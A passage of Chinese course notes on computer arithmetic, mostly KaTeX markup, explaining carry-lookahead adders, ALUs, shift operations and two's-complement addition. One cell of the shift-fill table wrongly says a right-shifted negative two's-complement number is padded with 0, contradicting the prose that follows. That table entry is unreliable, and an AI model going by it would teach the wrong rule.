mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>从上述表达式可以看出，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">C_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 仅与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mtext>、</mtext><msub><mi>B</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i \text{、}B_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">、</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 及最低进位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">C_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 有关，相互间的进位没有依赖关系。只要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo>∽</mo><msub><mi>A</mi><mn>4</mn></msub><mtext>、</mtext><msub><mi>B</mi><mn>1</mn></msub><mo>∽</mo><msub><mi>B</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">A_1 \backsim A_4 \text{、}B_1 \backsim B_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">∽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">、</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">∽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">C_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 同时到达，就可几乎同时形成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>∽</mo><msub><mi>C</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">C_1 \backsim C_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">∽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，并且同时生成各位的和。</p>
<p>实现上述逻辑表达式的电路称为 <strong>先行进位</strong>（也称超前进位）部件，简称 CLA 部件。通过这种进位方式实现的加法器称为 <strong>全先行进位加法器</strong>。因为各个进位是并行产生的，所以是一种并行加法器。</p>
<figure><figcaption>并行进位加法器</figcaption></figure>
<p>这种进位方式是快速的，与位数无关。但随着加法器位数的增加，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">C_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的逻辑表达式会变得越来越长，这会使电路结构变得很复杂。因此，当位数较多时采用全先行进位是不现实的。</p>
<p>更多位数的加法器可通过将 CLA 部件或全先行进位加法器串接起来实现。例如：对于 16 位加法器，可以分成 4 组，组内为 4 位先行进位，组间串行进位。为了进一步提高运算速度，也可以采用组内和组间都并行的进位方式。因为两级先行进位加法器组内和组间都采用先行进位方式，其延迟和加法器的位数没有关系。所以，通常采用两级或多级先行进位加法器。</p>
</li>
<li>
<p><strong>带标志加法器</strong></p>
<p>无符号数加法器只能用于两个无符号数相加，不能进行带符号整数的加/减运算。为了能进行带符号整数的加/减运算，还需要在无符号数加法器的基础上 <strong>增加相应的逻辑门电路</strong>，使得加法器不仅能计算和/差，还要能生成相应的标志信息。为了加快加法运算的速度，实际电路一定使用多级先行进位方式。</p>
<figure><figcaption>带标志加法器</figcaption></figure>
</li>
<li>
<p><strong>算术逻辑单元（ALU）</strong></p>
<p>ALU 是一种功能较强的组合逻辑电路，它能 <strong>进行多种算术运算和逻辑运算</strong>。由于加、减、乘、除运算最终都能归结为加法运算，因此 ALU 的核心是带标志加法器，同时也能执行 “与”、“或”、“非” 等逻辑运算。同时，ALU 也可以实现左移或右移的移位操作。</p>
<figure><figcaption>ALU</figcaption></figure>
</li>
</ol>
<h4> 定点数的移位运算</h4>
<ol>
<li>
<p><strong>算术移位</strong></p>
<p>算术移位的对象是有符号数，在移位过程中符号位保持不变。</p>
<p>对于正数，由于 [x]<sub>原</sub> = [x]<sub>补</sub> = [x]<sub>反</sub> = 真值，因此移位后出现的空位均以 0 填充。对于负数，由于原码、补码、反码的表示形式不同，因此当机器数移位时，对其空位的填充规则也不同。</p>
<p>对于带符号数，左移一位若不产生溢出，相当于乘以二（与十进制的左移一位相当于乘以十类似），右移一位，若不考虑因移出而舍去的末位尾数，相当于除以二。</p>
 <table style="text-align:center">
   <tbody><tr>
     <th>正负数</th>
     <th>码制</th>
     <th>填充代码</th>
   </tr>
   <tr>
     <td>正数</td>
     <td>原码、补码、反码</td>
     <td>0</td>
   </tr>
   <tr>
     <td rowspan="4">负数</td>
     <td>原码</td>
     <td>0</td>
   </tr>
   <tr>
     <td rowspan="2">补码</td>
     <td>左移填 0</td>
   </tr>
   <tr>
     <td>右移填 0</td>
   </tr>
   <tr>
     <td>反码</td>
     <td>1</td>
   </tr>
 </tbody></table>
<p>分析由原码得到补码的过程发现，当对其由低位向高位找到第一个 <code>1</code> 时，在此 <code>1</code> 左边的各位均与对应的反码相同，而在此 <code>1</code> 右边的各位（包括此 <code>1</code> 在内）均与对应的原码相同。故负数的补码左移时，因空位出现在低位，则添补的代码与原码相同，即添 <code>0</code>；右移时因空位出现在高位，则添补的代码应与反码相同，即添 <code>1</code>。</p>
</li>
<li>
<p><strong>逻辑移位</strong></p>
<p>逻辑移位将操作数视为无符号数。</p>
<p><strong>移位规则</strong>：逻辑左移时，高位移丢，低位添 <code>0</code>；逻辑右移时，低位移丢，高位添 <code>0</code>。</p>
</li>
<li>
<p><strong>循环移位</strong></p>
<p>循环移位分为带进位标志位 <code>CF</code> 的循环移位（大循环）和不带进位标志位的循环移位（小循环）。</p>
<p><strong>循环移位的主要特点</strong>：移出的数位又被移入数据中，而是否带进位则要看是否将进位标志位加入循环位移。例如：带进位位的循环左移，就是数据位连同进位标志位一起左移，数据的最高位移入进位标志位 <code>CF</code>，而进位位则依次移入数据的最低位。</p>
<p>循环移位操作特别适合将数据的低字节数据和高字节数据互换。</p>
</li>
</ol>
<h4> 定点数的加减运算</h4>
<p>事实上，在机器内部并没有小数点，只是人为约定了小数点的位置，小数点约定在最左边就是 <strong>定点小数</strong>，小数点约定在最右边就是 <strong>定点整数</strong>。因此，在运算过程中，可以不用考虑对应的定点数是小数还是整数，而只需关心它们的符号位和数值位即可。</p>
<ol>
<li>
<p><strong>补码的加减法运算</strong></p>
<p>补码加减运算规则简单，易于实现。补码加减运算的公式如下（设机器字长为 <code>n + 1</code>）：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">[</mo><mi>A</mi><mo>+</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mo stretchy="false">[</mo><mi>A</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>+</mo><mo stretchy="false">[</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mtext>（</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>&nbsp;</mtext><msup><mn>2</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mtext>）</mtext><mspace linebreak="newline"></mspace><mo stretchy="false">[</mo><mi>A</mi><mo>−</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mo stretchy="false">[</mo><mi>A</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>+</mo><mo stretchy="false">[</mo><mo>−</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mtext>（</mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>&nbsp;</mtext><msup><mn>2</mn><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mtext>）</mtext></mrow><annotation encoding="application/x-tex">
[A + B]_\text{补} = [A]_\text{补} + [B]_\text{补} \text{（}mod \space 2^{n+1} \text{）} \\
[A - B]_\text{补} = [A]_\text{补} + [-B]_\text{补} \text{（}mod \space 2^{n+1} \text{）}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">（</span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace">&nbsp;</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">）</span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span 